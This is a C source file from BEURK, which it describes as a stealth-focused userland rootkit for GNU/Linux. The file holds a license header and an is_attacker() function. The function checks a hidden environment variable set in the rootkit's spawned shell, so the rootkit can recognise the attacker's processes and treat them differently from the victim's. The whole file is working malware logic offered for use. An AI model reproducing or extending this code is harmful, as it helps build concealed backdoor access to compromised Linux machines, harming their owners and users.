/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include "beurk.h" /* prototype */
#include "config.h" /* HIDDEN_ENV_VAR */
#include "debug.h" /* DEBUG() */

/** is_attacker() checks if the process is called by the attacker,
 * using a special environment variable that is defined in our
 * spawned shell.
 */

int is_attacker(void) {
    init();
    DEBUG(D_INFO, "called is_attacker()");
    static int attacker = -1;

    if (attacker != -1)
        return (attacker);

    if (getenv(HIDDEN_ENV_VAR)) {
        DEBUG(D_INFO, "This is the attacker.");
        attacker = 1;
    }
    else {
        DEBUG(D_INFO, "This isn't the attacker.");
        attacker = 0;
    }
    return (attacker);
}
